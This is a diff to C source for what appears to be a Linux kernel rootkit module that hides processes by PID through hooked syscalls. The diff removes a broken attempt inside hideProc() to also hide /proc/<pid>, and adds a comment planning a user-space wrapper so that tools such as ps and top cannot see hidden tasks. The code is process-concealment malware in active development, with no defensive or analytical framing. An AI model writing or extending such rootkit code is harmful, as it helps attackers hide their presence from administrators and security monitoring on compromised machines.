@@ -29,10 +29,14 @@
 // and remove it from the list. If we don't there would be a nasty problem when
 // the PIDs wraps around.
 
-// TODO: There's much more to do, not only hook syscalls with pids, for example
-// ps, top and all this process-related utilities use /proc interface to get
-// information about tasks, so every syscall that deals with /proc should also
-// be hooked.
+// TODO: It would be much nicer if hiding would already implied hiding also its
+// /proc/<pid> interface. I tried a simple hidefile(/proc/<pid>) inside
+// hideProc() but then I realized that is not that easy because hideFile needs
+// a const char __USER * as filename (note __user), but the one that we build
+// and pass from here is not in user space but in kernel space, that provoke
+// hideFile() to fail. My solution right now is creating a user space program
+// that wraps all this logic and do both things at once. Maybe not as elegant
+// as doing it from here, but effective and quick.
 
 #include <linux/types.h>
 #include <linux/slab.h>
@@ -42,7 +46,6 @@
 #include "hideproc.h"
 #include "funcs.h"
 #include "debug.h"
-#include "hidefile.h"
 
 struct hide_pid {
 	struct list_head list;
@@ -85,7 +88,6 @@ void exit_hideproc() {
 int hideProc(pid_t pid) {
 	int res = -1;
 	struct hide_pid *tmp;
-	char procdir[128];
 
 	// Allocate a new struct hide_pid structure to maintain this new PID, of
 	// just if it wasn't previously hide.
@@ -95,11 +97,6 @@ int hideProc(pid_t pid) {
 		list_add(&(tmp->list), &(hide_pids_list.list));
 		res = 0;
 	}
-
-	// TODO: This is not working right now, debug and fix.
-	// Also hide /proc/<pid>.
-	sprintf(procdir, "/proc/%d", pid);
-	hideFile(procdir);
 
 	print_hide_tasks();
 	return res;
